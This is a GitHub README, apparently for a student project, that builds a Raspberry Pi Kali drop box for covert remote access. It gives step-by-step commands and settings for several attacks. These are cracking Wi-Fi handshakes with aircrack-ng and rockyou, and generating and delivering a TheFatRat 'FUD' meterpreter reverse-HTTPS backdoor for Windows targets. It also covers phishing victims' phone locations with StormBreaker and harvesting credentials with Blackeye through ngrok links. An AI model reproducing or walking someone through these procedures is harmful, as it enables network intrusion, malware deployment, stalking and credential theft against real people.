# Project-Pinfiltrate
IOT device capable of performing work reconnaissance in a plug and play usage 
# Flashing Kali to SD Card    
### Step 1
Download the kali image from kali.org. Ensure that the download is from the ARM section as shown below. Do make sure that the correct version is chosen. In this case, the first option is used.  
![image](https://user-images.githubusercontent.com/97077110/148011185-c190b42a-90aa-4d15-bba8-10e33dcc2072.png)  
### Step 2  
Install raspberry pi imager from https://www.raspberrypi.com/software/. This will allow you to flash kali into the SD card for the raspberry pi to boot. After downloading the software, proceed to run the raspberry pi imager. 
![image](https://user-images.githubusercontent.com/97077110/148011274-6f40d8f2-cf6d-4c12-92b8-b21ea1df0d95.png)  
### Step 4  
Select the kali OS downloaded online and choose to install it onto the SD card. Next click write. This process should take 15 minutes.   

### Step 5
Insert the sd card into the raspberry pi and boot it up. It should turn on like a normal computer with Kali Linux OS.  

Headless Setup:
To create a headless setup, we must configure the kali to autologin and auto connect to wifi. To do this,  I looked for the config file that was incharge of network connections (/etc/network/interfaces). 
Next, I edited the file to ensure kali auto connects to the network every time by adding the following.
```
auto wlan0
allow-hotplug wlan0
iface wlan0 inet manual
wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf
iface default inet dhcp
```
Afterwards, kali began to auto reconnect to internet every time we log in.  

Finally, to complete the headless setup, I had to configure auto-login. To do so, I editted the following config files ```/etc/lightdm & /etc/pam.d/```.  
```
# /etc/lightdm
autologin-user=root

autologin-user-timeout=0

# /etc/pam.d/

auth required pam_succeed_if.so user != root quiet_success
```
After a reboot, kali will now 
	1. Auto Login without user input
	2. Auto reconnect to a previously connected network wirelessly (Wi-Fi)
# Wireless security  
An area of attack that the team decides to attack is targeting devices that use wireless connection. By using Raspberry PI and a Wifi adapter, we will be able to scan and discover potential networks and exploit these networks using the right tool. This section will cover tools that will be used to bypass wireless defenses and perform penetration testing.

# Airodump  
Now, let's change the Mac address of this interface to hide our true identity. Use macchanger to change your Mac to a random value and specify your interface. There are options to switch to another type of device; however, for this example, we will just leave it as a random Mac address using the following command: ```macchanger -r wlan0```.  

## Automation Script:  
We have used a automation script from Github to run airodump and airo crack. 
Download the file from [https://github.com/no0bie/Automate-Aircrack-ng](url) and extract the fil onto Desktop.  
The team have added an additional code into this automated script.    
```
def c():
        l =open("NODELETE.txt","w")
        x=raw_input("Your wireshark file name:")
        time.sleep(1)
        command= "aircrack-ng -w /usr/share/wordlists/rockyou.txt"+" "+x 
        l.close()
        os.system(command)

elif a == "-c":
                c()



print("-c       (6)     Attempt to crack password")
``` 
Because the original script does not have aircrack capabilities we have appented this code into the script to enhance its capabilities.  

We have also added sequence numbers to the script so that users are able to know which sequences come first.  
![image](https://user-images.githubusercontent.com/97077110/148357955-6c77bf3e-eacb-4549-9802-cdcb58103ed7.png)  
 
## Using of the Automation script:  

### Step 1  
Run the command ```$  python automation.py``` , a menu will be displayed.  
![image](https://user-images.githubusercontent.com/97077110/148013026-14b6dc58-f439-4c0d-bbac-b0a5d0d253ae.png)  
### Step 2  
Download any tools that is required, run the command ```$  python automation.py -i```.  
The monitor mode in the wireless card enables the device to listen to every packet around us. While Managed mode captures packets that have the device’s MAC address.Therefore for us to start capturing packets and discovering networks around us. We have to set our wireless device into Monitor mode.  
### Step 3 
We shall switch the interface from managed mode to monitor mode.Run the command ```$  python automation.py -si```.  
![image](https://user-images.githubusercontent.com/97077110/148358380-e7bc81f8-1c6e-448d-89a4-c5aea64ab841.png)  
### Step 4  
We will detect all the networks around us to find a potential target by running the command ```$  python automation.py -m``` 
### Step 5  
Monitor a network (Target's network) by using the command ```$  python automation.py -mc```
![image](https://user-images.githubusercontent.com/97077110/148358676-0ef954cb-d576-47f9-8c6d-7163e8515e59.png)  
### Step 6
Run the command ```automation.py -d```.  
The channel can be found in step 3 under **CH**.  
The Mac address can be found in step 3 under **BSSID**.  
Now, we will try to capture traffic from that wireless device, we have to wait until **EAPOL** appears befire we end the process.  
![image](https://user-images.githubusercontent.com/97077110/148359144-f19b2320-9c55-4fdd-a4cc-b29861ab903d.png)  
### Step 7:  
Run the command ```automation.py -c  ```.  
Enter the wireshark file name that you have save   
![image](https://user-images.githubusercontent.com/97077110/148503822-088080df-59bf-4966-a840-efebef3a563e.png)


# Zerotier Vpn 
### Step 1
Head to [http://download.zerotier.com/debian/buster/pool/main/z/zerotier-one/](url) and locate the required file , which is zerotier-one_1.4.6_arm64.deb.  
![image](https://user-images.githubusercontent.com/97077110/148359739-81bbdd2a-da57-4bc2-9207-1ff761695c44.png)  
### Step 2
After locating the file , right click and click on *copy link address*. Next, head over to the Linux terminal , and key in ```wget http://download.zerotier.com/debian/buster/pool/main/z/zerotier-one/zerotier-one_1.4.6_arm64.deb```. The file will then be downloaded onto Linux.  
![image](https://user-images.githubusercontent.com/97077110/148359933-48ccb1f7-e5c5-4d9e-9fe0-37b8a86fc20c.png)  
### Step 3
The file can now be downloaded and de-packaged by using the command ``` sudo dpkg -i zerotier-one 1.4.6_arm64.deb```.  
![image](https://user-images.githubusercontent.com/97077110/148360115-637749e9-413e-41cd-8e44-19b35cb8f86e.png)  
### Step 4  
Zeroiter can be checked if it is successfully installed onto the Linux machine by using the command ```sudo zerotier-cli info```.  
![image](https://user-images.githubusercontent.com/97077110/148360322-f097fda5-5201-413d-ba35-678800f79c10.png)  
### Step 5  
Since zerotier is online, we can now procees to join a netowrk. However, to join a network, a Zerotier account is required. Thus, go to [https://my.zerotier.com/ ](url) and click on the create button to create a Zerotier account.  
![image](https://user-images.githubusercontent.com/97077110/148360560-8b898889-ba9d-441a-a09b-48d292d88067.png)  
### Step 6  
Click on *Create a network* on the Zerotier Central terminal and a network in Zerotier would then be created under your account.  
![image](https://user-images.githubusercontent.com/97077110/148360733-09c1932b-90fb-4bc8-af7b-e6ff47b2cb18.png)  
### Step 7  
copy the Network ID of the Zerotier network that you have created on the Linux terminal using command ```sudo zerotier-cli join networkID of your zerotier account```. In this situation, it would be *sudo zerotier-cli join d5e5fb653708e1db*.  
![image](https://user-images.githubusercontent.com/97077110/148361021-b77324f3-6590-4ec1-8dbf-b3977f5e26a6.png)  
### Step 8  
Use command ```sudo zerotier-cli peers``` to check if you have successfully joined the network. If successfully joined, people who are in the network will be shown.  
![image](https://user-images.githubusercontent.com/97077110/148361269-12c8e6ab-5981-4a51-b3a0-266951aa244b.png)  
### Step 9  
Wait for approximately 5 minutes on the Zerotier Central and refresh the page. New devices that had joined the network would be updated.  
![image](https://user-images.githubusercontent.com/97077110/148361514-01aeea67-14b6-4e87-83e6-761c589f987c.png)  
## Step 10  
Use command ```ip a``` on the Linux terminal to find out which ip address the Zerotier belongs to after you have successfully joined the network and Zerotier Central was shown appearing.  
![image](https://user-images.githubusercontent.com/97077110/148361807-a3fc424c-c973-49f7-9033-12061f5a7d9b.png)  
## Step 11  
Remote Desktop Conenction can now be established to the Raspberry Pi with the IP address of the Zerotier. In this situation, it would be *192.168.191.157*.  
![image](https://user-images.githubusercontent.com/97077110/148362548-4316e44d-dac1-4889-96d1-d1aa797d9357.png)  
Thus, Zerotier is now completely setup and you are able to remotely connect to the Raspberry Pi.  

# TheFatRat tool  

Installation of TheFatRat tool from GitHub.Run using command ```sudo git clone https://github.com/screetsec/TheFatRat```  
![image](https://user-images.githubusercontent.com/97077110/148495968-b5ff8cd0-f16e-4aaf-994b-9b7d19a233db.png)  
## Setup of TheFatRat tool
Use commmands   
```  
cd TheFatRat
sudo chmod +x setup.sh (allow permission)
sudo bash setup.sh
```  
![image](https://user-images.githubusercontent.com/97077110/148496107-f197f915-667b-435f-b1c4-083299940bd4.png)  
Keep settings default, **Select enter and yes**  
![image](https://user-images.githubusercontent.com/97077110/148496172-b5e27e9f-25fc-442e-936c-21b91890ba80.png)  
## To run the tool  
Use commands  
```  
cd TheFatRat
sudo fatrat  
```  
![image](https://user-images.githubusercontent.com/97077110/148496278-23186611-7d9e-4ea5-9c19-32e138e680c4.png)  
![image](https://user-images.githubusercontent.com/97077110/148496307-1e2055d1-5ee9-46cc-add9-f2dffe326e00.png)  
## Main page of TheFatRat tool  
For the epxloit, we are aiming o use this tool to create a backdoor in the target machine. Thus, we are choosing Create FUD backdoor 1000% with PwnWinds:  
```[TheFatRat]-[~]:06```  
![image](https://user-images.githubusercontent.com/97077110/148496436-54769cfd-90af-4282-8bae-af5164e21b98.png)  
Since our target machine uses a Windows Operating system, we chose Create a bat file + Powershell.  
```[TheFatRat]-[~]-[pwnwind]:[1]```  
![image](https://user-images.githubusercontent.com/97077110/148496539-7c8eb1fb-279f-4a2f-9104-8d19818bfa8b.png)  
## Configuration  
Set LHOST IP  as  **Host IP**   
Set Lport to **8080**  
Output file name can be any file name:**Any name**  
![image](https://user-images.githubusercontent.com/97077110/148496662-81aaa312-fc1f-4733-9c74-803c18663ccf.png)  
![image](https://user-images.githubusercontent.com/97077110/148496679-182cd1d9-df85-41af-a85d-c2b948b466c1.png)  
Choose **Windows/meterpreter/reverese_https**  
To create a file that can be used to remote access the target
Choose Payload:**6**  
![image](https://user-images.githubusercontent.com/97077110/148496778-daf48909-16e2-44dd-ac14-4d637ae44571.png)  
## Payload file:  
The payload file is stored in FatRat_Generated directory.This directory store all the .bat files that are created.The payload file is then copy into the **/var/www/html/** directory.  
```  
sudo -i  
cd FatRat_Generated  
cp filename.bat /var/www/html/(directoryname)  
```  
![image](https://user-images.githubusercontent.com/97077110/148496890-5807789f-dde9-4777-93fe-f188dc84cef8.png)  

## Target side:  
Go to browser and go to the Host IP address 172.16.35.14/FYP/  
![image](https://user-images.githubusercontent.com/97077110/148496961-ed19ae58-ddf2-4109-8c61-85709c90c3c8.png)  
Download the fyp.bat and run it on the target system.  
FinalRecon screenshot:  
![image](https://user-images.githubusercontent.com/97077110/148497186-f611528c-e547-4776-bb86-9cfbb140916a.png)  
![image](https://user-images.githubusercontent.com/97077110/148497210-c8392428-8308-477f-9f60-419f48e264f4.png)  
![image](https://user-images.githubusercontent.com/97077110/148497246-e58cf561-df5f-445a-bc18-20c07db60587.png)  
![image](https://user-images.githubusercontent.com/97077110/148497283-6c3681c7-8271-42b4-945b-cd4532ed8ffb.png)  
![image](https://user-images.githubusercontent.com/97077110/148497306-cc6cf98a-06a4-4e9f-a67b-7f6e8446dff2.png)  


# StormBreaker  
![image](https://user-images.githubusercontent.com/97077110/148505490-62e933a2-4809-4a5f-b4b1-ced4ca922be7.png)

To install stormbreaker use command git clone https://github.com/ultrasecurity/Storm-Breaker.git  

## Setting up StormBreaker  
### Step 1  
On linux terminal, Use commands.  
  
```cd Storm-Breaker```  
```sudo bash install.sh```  
  ![image](https://user-images.githubusercontent.com/97077110/148505656-3192afc8-f267-45bc-832d-bd86d02b2651.png)  
 ![image](https://user-images.githubusercontent.com/97077110/148505781-6b58edfd-a194-44ed-bc03-908436caf218.png)



### Step 2  
Create a ngrok account for public url hosting.  
![image](https://user-images.githubusercontent.com/97077110/148505889-ff90b637-b977-426e-8fc6-875c297d1303.png)
![image](https://user-images.githubusercontent.com/97077110/148505959-fdfc8ef8-38b3-4d46-b441-132ba5ec411b.png)

  
### Step 3  
Append the authtoken into ngrok in kali using command sudo ngrok authtoken (your token number).  
```sudo ngrok authtoken (your token number)```  
![image](https://user-images.githubusercontent.com/97077110/148506008-49eb7a3d-fea4-4d97-9ba7-6b37016b1ad8.png)
  
## Using StormBreaker  
### Step 1 
Use command  sudo python3 Storm-Breaker.py  
![image](https://user-images.githubusercontent.com/97077110/148506055-15f652d5-477b-4bb4-a06c-65617683e1f5.png)  


We are attempting to get the location of the target.    
```[STORM-BREAKER@HOME]:$ 4```
![image](https://user-images.githubusercontent.com/97077110/148506182-ec9b6603-0c3d-43c3-bacf-ac1630e9ba2c.png)  


Choose template :nearyou.  
```[STORM-BREAKER@HOME/GET-LOC/SELECT-TEMPLATE]:$ 1```  
![image](https://user-images.githubusercontent.com/97077110/148506323-24dd5d64-8004-4c7f-94b2-445868c5c20e.png)

Copy the link and send to the target.  

Once the Target opens the link , he/she will be prompted to enable location, once the target enables the location, it will immediately send it back to the host machine.  

![image](https://user-images.githubusercontent.com/97077110/148506354-06429a3b-35ba-4844-abdf-67edfd3f1943.png)

The target will see this on his/her phone.
The Target will be prompt to on his/her location adn the location will be send to the attacker.  

![image](https://user-images.githubusercontent.com/97077110/148506539-51c2506c-a9fb-41a0-968e-b746419e08ce.png)


The tool will provide the exact location using google map.   
![image](https://user-images.githubusercontent.com/97077110/148506581-d35cd297-9914-413b-b80e-b219597aae86.png)


## Blackeye:  
![image](https://user-images.githubusercontent.com/97077110/148507920-61c6d4de-572a-4471-999b-3f6dbb1c76ba.png)  



## Installation:
```$ sudo git clone https://github.com/An0nUD4Y /blackeye.git```  
![image](https://user-images.githubusercontent.com/97077110/148507953-1869121b-5a5c-4ea0-a30c-8f745e53ecf0.png)  


We need to edit certain values of the file as there are functions that do not work with the new version of kali. Therefore the author recommends the user to change the code.   

At line 436 change to:
```link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")```

![image](https://user-images.githubusercontent.com/97077110/148508086-f981dfb1-1d2f-4a9b-8297-fa9f54b7f35e.png)

![image](https://user-images.githubusercontent.com/97077110/148508147-d51bf81f-afe7-4bd1-aea1-1bf80f2bcd9e.png)



## Run the tool:
```$ sudo bash blackeye.sh```    
``` Choose an option : 6```  
![image](https://user-images.githubusercontent.com/97077110/148508266-60722c6b-82f6-4d78-933e-2acea804ee89.png)  

The target will see this , when he or she click into the link.  
![image](https://user-images.githubusercontent.com/97077110/148508408-c0c57fb3-3f2b-4c3a-a682-aff226803158.png)  


## Credential found  
![image](https://user-images.githubusercontent.com/97077110/148508563-50dfe0b2-0da1-48e4-a4c0-6a5d425e806a.png)







































































  
